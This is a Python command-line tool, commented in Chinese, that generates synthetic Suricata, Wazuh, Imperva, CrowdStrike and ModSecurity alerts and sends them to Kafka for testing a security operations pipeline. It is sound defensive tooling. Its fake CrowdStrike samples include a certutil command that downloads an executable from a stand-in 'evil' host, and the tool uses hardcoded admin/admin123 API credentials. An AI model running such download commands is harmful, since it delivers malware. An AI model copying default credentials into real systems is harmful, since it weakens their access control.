#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
USOP · 安全产品告警 Kafka 发送工具
=================================

向 Kafka 发送**各安全产品的原始告警数据**，使其完整走
「标准化 → 过滤去重 → 分流 → ES 双索引 → 关联分析」链路。

设计要点
--------
1. 发送的是**设备原生格式**（eve.json / alerts.json / LEEF / Falcon JSON /
   Apache error log），由 USOP 的 `app/utils/alert_parsers.PARSER_REGISTRY`
   按 topic 名解析为标准告警 —— 与平台自身 `_build_sample` 的约定一致。
2. 每个产品对应固定 topic：
       suricata     -> suricata-alert
       wazuh        -> wazuh-alert
       imperva      -> imperva-alert   (waf-alert 亦映射到同一解析器)
       crowdstrike  -> crowdstrike-alert
       modsecurity  -> modsecurity-alert
3. 消费线程只在 topic 绑定到「active 的 DataSource」时才会被拉起。
   用 `--register` 可经 USOP API 自动建 DataSource 并启动采集，实现端到端打通。

依赖
----
   pip install kafka-python
   （USOP 后端容器内已自带；本机运行需自行安装。）

用法
----
   # 查看支持的产品与默认 topic
   python kafka_alert_sender.py list

   # 发送 5 条随机 Suricata 告警（仅打印，不真正发送）
   python kafka_alert_sender.py send suricata --count 5 --dry-run

   # 真实发送 3 条 Wazuh 告警，并自动注册 DataSource 拉起消费
   python kafka_alert_sender.py send wazuh --count 3 --register

   # 用自定义原始 JSON 发一条 CrowdStrike 告警
   python kafka_alert_sender.py send crowdstrike --data ./my_crowdstrike.json

   # 给 Imperva 发一条原始 LEEF 文本（文本产品自动包成 {"raw": "..."}）
   python kafka_alert_sender.py send imperva --data ./my_leef.txt

   # 覆盖目标 topic / broker / 限速
   python kafka_alert_sender.py send modsecurity --broker kafka:29092 --topic modsecurity-alert --rate 0.5

   # ---- 真实公开数据集（Suricata eve.json，来自 GitHub 公开样本） ----
   python kafka_alert_sender.py dataset list              # 查看内置数据集
   python kafka_alert_sender.py dataset fetch             # 全部下载到本地缓存
   python kafka_alert_sender.py dataset preview suricata-wrccdc-2018
   python kafka_alert_sender.py dataset import suricata-wrccdc-2018 --count 50 --register
   python kafka_alert_sender.py dataset import /path/to/my_eve.json --topic suricata-alert
   # 也可直接给本地文件（支持 JSON 数组或 JSONL）；--keep-timestamp 保留样本原始时间
"""

import argparse
import json
import os
import random
import sys
import time
from datetime import datetime, timezone, timedelta

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import alert_datasets as DS  # noqa: E402  公开真实告警数据集模块

# ---------------------------------------------------------------------------
# 产品注册表
# ---------------------------------------------------------------------------

CST = timezone(timedelta(hours=8))


def _now_iso() -> str:
    """生成解析器友好的 ISO 时间戳（含 +0000 时区，与 _build_sample 一致）。"""
    return datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.000000+0000')


def _now_iso_z() -> str:
    return datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')


def _rand_ip(public: bool = True) -> str:
    if public:
        return f"{random.randint(11, 223)}.{random.randint(0, 255)}." \
               f"{random.randint(0, 255)}.{random.randint(1, 254)}"
    # 内网段
    return random.choice([
        f"10.0.0.{random.randint(2, 254)}",
        f"192.168.{random.randint(0, 255)}.{random.randint(2, 254)}",
        f"172.16.{random.randint(0, 255)}.{random.randint(2, 254)}",
    ])


# ---- 真实感数据池 ----------------------------------------------------------

_SURICATA_SIGS = [
    (2000001, "ET SCAN Potential SSH Scan", "Attempted Information Leak", 2),
    (2000002, "ET WEB_SERVER SQL Injection Attempt", "Web Application Attack", 3),
    (2000003, "ET POLICY Suspicious User-Agent", "Attempted Administrator Privilege Gain", 2),
    (2000004, "ET DOS Potential DDoS Attack", "Denial of Service", 3),
    (2000005, "ET EXPLOIT Buffer Overflow Attempt", "Attempted Privilege Escalation", 3),
    (2000006, "ET MALWARE Ransomware Traffic Detected", "A Network Trojan was detected", 3),
    (2000007, "ET POLICY Crypto Mining Traffic", "Attempted Information Leak", 2),
    (2000008, "ET SCAN Port Scan Detection", "Attempted Information Leak", 1),
    (2000011, "ET TROJAN Cobalt Strike Beacon Observed", "A Network Trojan was detected", 1),
    (2000015, "ET EXPLOIT Possible CVE-2021-44228 Log4j", "Web Application Attack", 1),
]

_WAZUH_RULES = [
    (5710, "Multiple failed login attempts", ["authentication", "login"], 7,
     ["T1110", "Brute Force"], ["Credential Access"]),
    (5712, "SSHD authentication success", ["authentication", "ssh"], 3,
     [], []),
    (1002, "Web server 400 error code", ["web", "error"], 5,
     [], []),
    (550, "User with UID 0 executed command", ["syslog", "root"], 8,
     ["T1078", "Valid Accounts"], ["Privilege Escalation"]),
    (502, "User login succeeded", ["authentication"], 3, [], []),
    (87907, "Suspicious privilege escalation", ["attack", "escalation"], 12,
     ["T1068", "Exploitation for Privilege Escalation"], ["Privilege Escalation"]),
    (8130, "Web attack detected", ["web", "attack"], 10,
     ["T1190", "Exploit Public-Facing Application"], ["Initial Access"]),
]

_IMPERVA_ALERT_TYPES = [
    "SQL Injection", "Cross-Site Scripting (XSS)", "Directory Traversal",
    "Remote File Inclusion", "Parameter Tampering", "Server Side Request Forgery",
    "Bot Access", "Brute Force",
]

_CS_DETECTS = [
    "Suspicious Process Injection", "Ransomware Behavior Detected",
    "Credential Dumping via Mimikatz", "Lateral Movement using PsExec",
    "Suspicious PowerShell Encoded Command", "Malware Family: Emotet",
    "Unauthorized File Encryption", "Suspicious Service Creation",
]

_MODSEC_RULES = [
    (942100, "SQL Injection Attack Detected via libinjection", "CRITICAL"),
    (941100, "XSS Attack Detected via libinjection", "ERROR"),
    (930100, "Path Traversal Attack", "WARNING"),
    (931100, "Remote File Inclusion Attack", "ERROR"),
    (920270, "Invalid Character in Request", "NOTICE"),
]

_URLS = ["/api/login", "/admin", "/wp-admin/", "/user/profile", "/search?q=",
         "/index.php", "/config.php", "/.env", "/api/v1/users"]


# ---------------------------------------------------------------------------
# 各产品「原始告警」生成器（device-native 格式，供解析器消费）
# ---------------------------------------------------------------------------

def gen_suricata() -> dict:
    sid, sig, cat, sev = random.choice(_SURICATA_SIGS)
    src = _rand_ip()
    dst = _rand_ip(public=False)
    proto = random.choice(["TCP", "UDP", "TCP", "TCP"])
    dport = random.choice([22, 80, 443, 3306, 5432, 8080, 8443, 6379])
    rec = {
        "timestamp": _now_iso(),
        "event_type": "alert",
        "src_ip": src,
        "src_port": random.randint(1024, 65535),
        "dest_ip": dst,
        "dest_port": dport,
        "proto": proto,
        "app_proto": "http" if dport in (80, 8080, 443, 8443) else "tcp",
        "alert": {
            "action": random.choice(["allowed", "blocked", "flagged"]),
            "signature_id": sid,
            "gid": 1,
            "rev": random.randint(1, 5),
            "signature": sig,
            "category": cat,
            "severity": sev,
        },
        "flow_id": random.randint(10**17, 10**18),
    }
    # 约 60% 概率附带 http 上下文
    if proto == "TCP" and dport in (80, 8080, 443, 8443) and random.random() < 0.6:
        rec["http"] = {
            "hostname": f"www.example{random.randint(1, 9)}.com",
            "url": random.choice(_URLS),
            "http_method": random.choice(["GET", "POST", "GET", "PUT"]),
            "http_user_agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (X11; Linux x86_64)",
                "curl/8.0", "sqlmap/1.7",
            ]),
            "http_content_type": "text/html",
            "status": random.choice([200, 403, 500, 301]),
        }
    return rec


def gen_wazuh() -> dict:
    rid, desc, groups, level, mitre_id, mitre_tac = random.choice(_WAZUH_RULES)
    src = _rand_ip()
    return {
        "timestamp": _now_iso(),
        "rule": {
            "level": level,
            "description": desc,
            "id": str(rid),
            "groups": groups,
            "mitre": {
                "id": mitre_id,
                "tactic": mitre_tac,
                "technique": mitre_id,
            } if mitre_id else {},
        },
        "agent": {
            "id": f"{random.randint(1, 999):03d}",
            "name": f"agent-{random.choice(['web', 'db', 'win', 'linux'])}-{random.randint(1, 20)}",
            "ip": src if random.random() < 0.7 else _rand_ip(public=False),
        },
        "decoder": {"name": random.choice(["json", "auditd", "sshd", "windows_eventchannel"])},
        "data": {
            "srcip": src,
            "srcport": random.randint(1024, 65535),
            "dstip": _rand_ip(public=False),
            "dstport": random.choice([22, 3389, 445, 80, 443]),
            "dstuser": random.choice(["root", "administrator", "admin", "unknown"]),
            "srcuser": random.choice(["", "sshd", "system"]),
            "full_log": f"{desc} from {src}",
        },
        "full_log": f"{desc} from {src}",
        "location": random.choice(["/var/log/auth.log", "(null)", "EventChannel"]),
    }


def gen_imperva() -> dict:
    src = _rand_ip()
    dst = _rand_ip(public=False)
    atype = random.choice(_IMPERVA_ALERT_TYPES)
    severity = random.choice(["Low", "Medium", "High", "Critical"])
    alert_id = random.randint(900000, 999999)
    # LEEF: LEEF:Version|Vendor|Product|ProductVersion|EventClass|KVPairs
    # 注意：平台 parse_imperva 先按 '|' 切分，再要求 KV 对之间也用 '|' 分隔
    # （其正则 (\w[\w\s]*?)=([^|]*?)(?=\||$) 仅以 '|' 作为键值对边界），
    # 故 KV 对之间必须用 '|' 而非空格，否则 src/dst/Severity 等字段会解析错位。
    kvp = "|".join([
        f"src={src}", f"dst={dst}", f"Severity={severity}",
        f"Alert type={atype}", f"Alert Description={atype} detected",
        "dp=443", "Application name=WebApp-Prod", "Server Group=SG-Default",
        f"devTime={_now_iso_z()}", f"Alert ID={alert_id}", f"Event ID={alert_id}",
        "usrName=attacker", "Service name=HTTP", "Immediate Action=Block",
    ])
    leef = f"LEEF:1.0|Imperva|SecureSphere|11.0.0|{atype}|{kvp}"
    # 解析器接受 dict 且取 raw/message 字段，因此包成 {"raw": "<LEEF 文本>"}
    return {"raw": leef}


def gen_crowdstrike() -> dict:
    name = random.choice(_CS_DETECTS)
    src = _rand_ip()
    dst = _rand_ip(public=False)
    kill = random.random() < 0.5
    quar = kill and random.random() < 0.6
    return {
        "event": {
            "EventType": "DetectionSummaryEvent",
            "DetectName": name,
            "DetectDescription": f"{name} observed on endpoint",
            "FileName": random.choice(["malware.exe", "powershell.exe", "mimikatz.dll", "svchost.exe"]),
            "FilePath": random.choice([r"C:\Windows\Temp", r"C:\Users\Admin\AppData\Local", "/tmp"]),
            "CommandLine": random.choice([
                "powershell -enc JAB...", "cmd /c whoami",
                "rundll32 suspicious.dll", "certutil -urlcache -f http://evil/p.exe",
            ]),
            "ParentCommandLine": "explorer.exe",
            "ParentImageFileName": "explorer.exe",
            "FalconHostLink": f"https://falcon.crowdstrike.com/detections/{random.randint(10**9, 10**10)}",
            "LocalIP": src,
            "SensorIP": src,
            "RemoteIP": dst,
            "ComputerName": f"WIN-{random.randint(1000, 9999)}",
            "Hostname": f"HOST-{random.randint(1000, 9999)}",
            "Timestamp": _now_iso_z(),
            "Technique": random.choice(["T1059", "T1003", "T1021", "T1486"]),
            "Tactic": random.choice(["Execution", "Credential Access", "Lateral Movement", "Impact"]),
            "PatternDispositionFlags": {
                "Detect": True,
                "QuarantineFile": quar,
                "KillProcess": kill,
                "Containment": kill,
            },
        },
        "metadata": {
            "customerIDString": "usop-demo",
            "eventType": "DetectionSummaryEvent",
            "offset": random.randint(10**9, 10**10),
        },
    }


def gen_modsecurity() -> dict:
    src = _rand_ip()
    dst = _rand_ip(public=False)
    rid, msg, sev = random.choice(_MODSEC_RULES)
    ts = datetime.now().strftime("%a %b %d %H:%M:%S %Y")
    code = random.choice([403, 403, 400, 501])
    uid = f"@{random.randint(10**9, 10**10)}@{random.randint(10**9, 10**10)}"
    uri = random.choice(_URLS)
    action = "Access denied" if code == 403 else "Pattern match"
    line = (
        f"[{ts}] [client {src}] ModSecurity: {action} with code {code} (phase 2). "
        f"[id \"{rid}\"] [msg \"{msg}\"] [severity \"{sev}\"] "
        f"[uri \"{uri}\"] [unique_id \"{uid}\"]"
    )
    # 解析器接受 dict 且取 raw/message 字段
    return {"raw": line}


# 产品 -> 生成器 / 默认 topic / 格式 / 说明
PRODUCTS = {
    "suricata": {
        "topic": "suricata-alert",
        "fmt": "json",
        "gen": gen_suricata,
        "desc": "Suricata (NIDS) · eve.json 告警事件",
    },
    "wazuh": {
        "topic": "wazuh-alert",
        "fmt": "json",
        "gen": gen_wazuh,
        "desc": "Wazuh (HIDS/SIEM) · alerts.json 告警",
    },
    "imperva": {
        "topic": "imperva-alert",
        "fmt": "text",
        "gen": gen_imperva,
        "desc": "Imperva SecureSphere (WAF) · LEEF 格式（包为 {\"raw\": ...}）",
    },
    "crowdstrike": {
        "topic": "crowdstrike-alert",
        "fmt": "json",
        "gen": gen_crowdstrike,
        "desc": "CrowdStrike Falcon (EDR) · DetectionSummaryEvent",
    },
    "modsecurity": {
        "topic": "modsecurity-alert",
        "fmt": "text",
        "gen": gen_modsecurity,
        "desc": "ModSecurity (WAF) · Apache error log（包为 {\"raw\": ...}）",
    },
}


# ---------------------------------------------------------------------------
# Kafka 发送
# ---------------------------------------------------------------------------

def _make_producer(broker: str):
    try:
        from kafka import KafkaProducer
        from kafka.serializer import Serializer
    except ImportError:
        # 抛异常而非 sys.exit：GUI 作为常驻服务复用本模块时，exit 会杀掉整个进程
        raise RuntimeError(
            "缺少依赖 kafka-python。请在运行环境执行: pip install kafka-python "
            "（USOP 后端容器内已自带；本机直跑需自行安装）"
        )

    class _JsonSerializer(Serializer):
        def serialize(self, topic, value):
            return json.dumps(value, ensure_ascii=False).encode("utf-8")

    class _StrSerializer(Serializer):
        def serialize(self, topic, value):
            return value.encode("utf-8") if value is not None else None

    return KafkaProducer(
        bootstrap_servers=broker,
        value_serializer=_JsonSerializer(),
        key_serializer=_StrSerializer(),
        acks="all",
        retries=3,
    )


def _send_one(producer, topic: str, payload: dict, key: str = None) -> dict:
    meta = producer.send(topic, value=payload, key=key).get(timeout=15)
    return {"partition": meta.partition, "offset": meta.offset}


# ---------------------------------------------------------------------------
# 自定义数据加载
# ---------------------------------------------------------------------------

def _load_custom(product: str, data_arg: str) -> dict:
    """从 --data 解析自定义原始负载。
    - 以 @ 开头 -> 文件路径（文件内容可为 JSON 或纯文本）
    - 否则先尝试按内联 JSON 解析，失败则视为纯文本
    文本类产品的纯文本会自动包成 {"raw": text}。
    """
    fmt = PRODUCTS[product]["fmt"]
    raw_text = None
    parsed = None

    if data_arg.startswith("@"):
        path = data_arg[1:]
        if not os.path.isfile(path):
            sys.stderr.write(f"✗ 文件不存在: {path}\n")
            sys.exit(2)
        with open(path, "r", encoding="utf-8") as f:
            content = f.read().strip()
        try:
            parsed = json.loads(content)
        except json.JSONDecodeError:
            raw_text = content
    else:
        try:
            parsed = json.loads(data_arg)
        except json.JSONDecodeError:
            raw_text = data_arg

    if parsed is not None:
        if not isinstance(parsed, dict):
            sys.stderr.write("✗ 自定义 JSON 必须是对象（dict）。\n")
            sys.exit(2)
        # 文本类产品：允许直接传 {"raw": "..."} 或 {"message": "..."}
        return parsed

    # 纯文本路径（仅文本类产品有意义）
    if fmt == "text":
        return {"raw": raw_text}
    sys.stderr.write(
        f"✗ 产品 {product} 为 JSON 格式，--data 应为合法 JSON 对象；"
        f"你提供的是纯文本。\n"
    )
    sys.exit(2)


# ---------------------------------------------------------------------------
# 经 USOP API 注册 DataSource（拉起消费线程，实现端到端）
# ---------------------------------------------------------------------------

def register_datasource(api_base: str, topic: str, device_type: str,
                        user: str, password: str, log=print) -> bool:
    try:
        import requests
    except ImportError:
        log("⚠ 注册需要 requests 库，跳过自动注册（告警仍在 Kafka 中）。")
        return False
    try:
        r = requests.post(f"{api_base}/api/auth/login",
                          json={"username": user, "password": password}, timeout=8)
        token = r.json().get("data", {}).get("token")
        if not token:
            log(f"⚠ 登录 USOP 失败（{api_base}），跳过注册。")
            return False
        r2 = requests.post(f"{api_base}/api/pipeline/device-topics",
                           json={"topic": topic, "device_type": device_type},
                           headers={"Authorization": f"Bearer {token}"}, timeout=10)
        if r2.status_code in (200, 201) and r2.json().get("success"):
            log(f"  ✓ 已注册 DataSource 并拉起消费线程: topic={topic} device_type={device_type}")
            return True
        log(f"⚠ 注册返回: {r2.status_code} {r2.text[:200]}")
        return False
    except Exception as e:
        log(f"⚠ 注册异常: {e}")
        return False


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_list(_args):
    print("USOP 支持的告警产品 / Kafka topic：\n")
    print(f"  {'产品':<12}{'默认 topic':<22}{'格式':<6}说明")
    print(f"  {'-'*12}{'-'*22}{'-'*6}{'-'*40}")
    for name, info in PRODUCTS.items():
        print(f"  {name:<12}{info['topic']:<22}{info['fmt']:<6}{info['desc']}")
    print("\n提示: send 子命令默认 broker=localhost:9092，可用 --broker / --topic 覆盖。")


def emit(payloads, broker, topic, rate=0.0, key=None, register=False,
         api_base="http://localhost:5001", api_user="admin", api_pass="admin123",
         register_wait=5.0, no_wait=False, device_type=None,
         dry_run=False, label="alert", log=print, stop_check=None):
    """发送一批负载到 Kafka（CLI 与 GUI 共用）。返回 (成功数, 总数)。

    :param stop_check: 可选回调，返回 True 时中止发送（GUI 的「停止」按钮）
    """
    total = len(payloads)

    if dry_run:
        log(f"[DRY-RUN] broker={broker} topic={topic} count={total}（仅打印，不发送）")
        for i, p in enumerate(payloads, 1):
            log(f"--- #{i} ({label}) ---")
            log(json.dumps(p, ensure_ascii=False, indent=2))
        return 0, total

    # 可选：先注册 DataSource 拉起消费
    if register:
        ok = register_datasource(api_base, topic, device_type or label,
                                 api_user, api_pass, log=log)
        if ok and not no_wait:
            # 消费线程启动 + Kafka 消费组 rebalance 需要数秒；
            # 而流水线消费用 auto_offset_reset='latest'，若此刻立刻发送，
            # 消息可能落在消费组初始位移之前被跳过。等待其稳定后再发。
            log(f"  … 等待消费线程稳定（{register_wait}s）…")
            time.sleep(register_wait)

    producer = _make_producer(broker)
    ok = 0
    stopped = False
    try:
        for i, p in enumerate(payloads, 1):
            if stop_check and stop_check():
                stopped = True
                log(f"  ⏹ 已中止（{ok}/{total} 已发送）")
                break
            try:
                res = _send_one(producer, topic, p, key=key)
                ok += 1
                log(f"  [{i}/{total}] ✓ -> {topic} "
                    f"(partition={res['partition']}, offset={res['offset']})")
            except Exception as e:
                log(f"  [{i}/{total}] ✗ 发送失败: {e}")
            if rate and i < total:
                time.sleep(rate)
        producer.flush()
        if not stopped:
            log(f"\n完成: 成功 {ok}/{total} 条 -> {topic}")
            if ok and not register:
                log("提示: 若告警未出现在「安全告警」，请确认该 topic 已绑定 active "
                    "DataSource（可在页面「流水线→设备接入」启用，或用 --register）。")
    finally:
        producer.close()
    return ok, total


def cmd_send(args):
    product = args.product.lower()
    if product not in PRODUCTS:
        sys.stderr.write(
            f"✗ 未知产品: {product}\n支持: {', '.join(PRODUCTS.keys())}\n"
        )
        sys.exit(2)
    info = PRODUCTS[product]
    topic = args.topic or info["topic"]

    # 收集待发送负载
    payloads = []
    for _ in range(args.count):
        if args.data:
            payloads.append(_load_custom(product, args.data))
        else:
            payloads.append(info["gen"]())

    emit(payloads, broker=args.broker, topic=topic, rate=args.rate, key=args.key,
         register=args.register, api_base=args.api_base, api_user=args.api_user,
         api_pass=args.api_pass, register_wait=args.register_wait,
         no_wait=args.no_wait, device_type=product,
         dry_run=args.dry_run, label=product)


# ---------------------------------------------------------------------------
# 公开真实数据集子命令
# ---------------------------------------------------------------------------

def cmd_dataset(args):
    action = args.action

    if action == "list":
        print("内置公开告警数据集（真实设备告警样本）：\n")
        print(f"  {'id':<26}{'产品':<11}{'topic':<20}{'条数':<7}{'缓存':<7}说明")
        print(f"  {'-'*26}{'-'*11}{'-'*20}{'-'*7}{'-'*7}{'-'*32}")
        for d in DS.dataset_state():
            print(f"  {d['id']:<26}{d['product']:<11}{d['topic']:<20}"
                  f"{d['count']:<7}{'是' if d['cached'] else '否':<7}{d['desc']}")
        print("\n用法: dataset fetch [<id>...] | preview <id> | import <id|路径> [选项]")
        return

    if action == "fetch":
        ids = args.ids or list(DS.DATASETS)
        for ds_id in ids:
            print(f"[{ds_id}]")
            try:
                DS.fetch(ds_id, force=args.force)
            except Exception as e:
                sys.stderr.write(f"  ✗ {e}\n")
        return

    if action == "preview":
        try:
            recs = DS.load_records(args.id, limit=args.count,
                                   refresh_time=not args.keep_timestamp)
        except Exception as e:
            sys.stderr.write(f"✗ {e}\n")
            sys.exit(2)
        print(f"[PREVIEW] {args.id} · {len(recs)} 条（仅打印，不发送）\n")
        for i, r in enumerate(recs, 1):
            print(f"--- #{i} ---")
            print(json.dumps(r, ensure_ascii=False, indent=2))
        return

    if action == "import":
        src = args.id
        # 默认 topic：内置数据集用其自带 topic；本地文件需 --topic 或按产品推断
        topic = args.topic
        if not topic:
            if src in DS.DATASETS:
                topic = DS.DATASETS[src]["topic"]
            else:
                sys.stderr.write("✗ 本地文件请用 --topic 指定目标 topic（如 suricata-alert）。\n")
                sys.exit(2)
        try:
            payloads = DS.load_records(
                src, limit=args.count,
                refresh_time=not args.keep_timestamp,
                event_type_filter=args.event_type,
            )
        except Exception as e:
            sys.stderr.write(f"✗ {e}\n")
            sys.exit(2)
        if not payloads:
            sys.stderr.write("✗ 未加载到任何记录。\n")
            sys.exit(2)
        print(f"[IMPORT] 源={src} · {len(payloads)} 条 -> topic={topic}")
        # 注册 DataSource 时 device_type 必须是产品名（决定用哪个解析器），
        # 不能拿数据集 id 顶替——否则会把数据源的 product_type 写成数据集名。
        dev = args.device_type or DS.DATASETS.get(src, {}).get("product") or "suricata"
        emit(payloads, broker=args.broker, topic=topic, rate=args.rate,
             key=args.key, register=args.register, api_base=args.api_base,
             api_user=args.api_user, api_pass=args.api_pass,
             register_wait=args.register_wait, no_wait=args.no_wait,
             device_type=dev, dry_run=args.dry_run, label=src)
        return

    sys.stderr.write(f"✗ 未知动作: {action}\n")
    sys.exit(2)


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="kafka_alert_sender.py",
        description="向 Kafka 发送各安全产品的原始告警数据（USOP 流水线接入工具）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = p.add_subparsers(dest="command", required=True)

    sub.add_parser("list", help="列出支持的产品与默认 topic").set_defaults(func=cmd_list)

    sp = sub.add_parser("send", help="发送告警（默认随机生成；可用 --data 自定义）")
    sp.add_argument("product", help="产品: " + "/".join(PRODUCTS.keys()))
    sp.add_argument("--broker", default=os.getenv("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092"),
                    help="Kafka bootstrap-servers（默认 localhost:9092，容器间用 kafka:29092）")
    sp.add_argument("--topic", default=None, help="覆盖默认目标 topic")
    sp.add_argument("--count", type=int, default=1, help="发送条数（默认 1）")
    sp.add_argument("--rate", type=float, default=0.0, help="每条间隔秒数（限速）")
    sp.add_argument("--data", default=None,
                    help="自定义原始负载: @文件路径 或 内联 JSON；文本产品也可直接给纯文本")
    sp.add_argument("--key", default=None, help="Kafka 消息 key")
    sp.add_argument("--dry-run", action="store_true", help="仅打印负载，不真正发送")
    sp.add_argument("--register", action="store_true",
                    help="经 USOP API 自动建 DataSource 并拉起消费线程（端到端打通）")
    sp.add_argument("--register-wait", type=float, default=5.0,
                    help="--register 后等待消费线程稳定的秒数（默认 5，规避 latest-offset 竞态）")
    sp.add_argument("--no-wait", action="store_true",
                    help="--register 后不等待，立即发送（消费线程已先行启动时用）")
    sp.add_argument("--api-base", default="http://localhost:5001", help="USOP API 基址（--register 用）")
    sp.add_argument("--api-user", default="admin", help="USOP 登录账号（--register 用）")
    sp.add_argument("--api-pass", default="admin123", help="USOP 登录密码（--register 用）")
    sp.set_defaults(func=cmd_send)

    # ---- dataset：公开真实告警数据集 ----
    dp = sub.add_parser("dataset", help="公开真实告警数据集（下载/预览/导入 Kafka）")
    dsub = dp.add_subparsers(dest="action", required=True)

    dsub.add_parser("list", help="列出内置数据集").set_defaults(func=cmd_dataset)

    fp = dsub.add_parser("fetch", help="下载数据集到本地缓存")
    fp.add_argument("ids", nargs="*", help="数据集 id（留空=全部）")
    fp.add_argument("--force", action="store_true", help="已缓存也重新下载")
    fp.set_defaults(func=cmd_dataset, action="fetch")

    pp = dsub.add_parser("preview", help="预览数据集内容（不发送）")
    pp.add_argument("id", help="数据集 id 或本地文件路径")
    pp.add_argument("--count", type=int, default=2, help="预览条数")
    pp.add_argument("--keep-timestamp", action="store_true", help="保留样本原始时间")
    pp.set_defaults(func=cmd_dataset, action="preview")

    ip = dsub.add_parser("import", help="把数据集/本地文件灌入 Kafka")
    ip.add_argument("id", help="数据集 id 或本地 eve.json 路径")
    ip.add_argument("--broker", default=os.getenv("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092"))
    ip.add_argument("--topic", default=None, help="目标 topic（内置数据集可省略）")
    ip.add_argument("--count", type=int, default=None, help="最多导入条数（默认全部）")
    ip.add_argument("--rate", type=float, default=0.0, help="每条间隔秒数")
    ip.add_argument("--key", default=None, help="Kafka 消息 key")
    ip.add_argument("--event-type", default=None,
                    help="仅导入指定 event_type（如 alert）")
    ip.add_argument("--keep-timestamp", action="store_true",
                    help="保留样本原始时间（默认平移到当前，保留相对时序）")
    ip.add_argument("--device-type", default=None,
                    help="--register 时的 device_type（默认按数据集产品推断）")
    ip.add_argument("--dry-run", action="store_true", help="仅打印，不发送")
    ip.add_argument("--register", action="store_true", help="自动建 DataSource 并拉起消费")
    ip.add_argument("--register-wait", type=float, default=5.0)
    ip.add_argument("--no-wait", action="store_true")
    ip.add_argument("--api-base", default="http://localhost:5001")
    ip.add_argument("--api-user", default="admin")
    ip.add_argument("--api-pass", default="admin123")
    ip.set_defaults(func=cmd_dataset, action="import")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)
    try:
        args.func(args)
    except RuntimeError as e:
        sys.stderr.write(f"✗ {e}\n")
        sys.exit(1)
    except KeyboardInterrupt:
        sys.stderr.write("\n已取消\n")
        sys.exit(130)


if __name__ == "__main__":
    main()
